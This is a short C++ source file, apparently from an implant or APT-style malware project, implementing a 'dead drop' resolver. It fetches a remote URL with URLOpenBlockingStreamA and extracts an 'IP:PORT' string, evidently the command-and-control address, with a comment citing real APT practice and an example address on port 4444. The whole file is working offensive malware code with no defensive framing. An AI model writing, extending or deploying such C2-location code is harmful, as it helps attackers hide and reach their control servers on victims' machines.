#include "exfil/dead_drop.hpp"
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <fstream>
#include <sstream>

#pragma comment(lib, "urlmon.lib")

std::string DeadDrop::Resolve(const std::string& url) {
    IStream* stream;
    // URLOpenBlockingStream is simple and effective for this
    // In a real APT, we might use WinHTTP to impersonate a browser user-agent
    if (URLOpenBlockingStreamA(0, url.c_str(), &stream, 0, 0) != S_OK) {
        return "";
    }

    std::stringstream ss;
    char buffer[100];
    unsigned long bytesRead;
    while(true) {
        stream->Read(buffer, sizeof(buffer)-1, &bytesRead);
        if(bytesRead == 0) break;
        buffer[bytesRead] = '\0';
        ss << buffer;
    }
    
    stream->Release();
    
    // Expecting format: "IP:PORT" e.g., "192.168.0.3:4444"
    // Trim whitespace
    std::string result = ss.str();
    size_t first = result.find_first_not_of(" \t\n\r");
    size_t last = result.find_last_not_of(" \t\n\r");
    if (first == std::string::npos || last == std::string::npos) return "";
    
    return result.substr(first, (last-first+1));
}
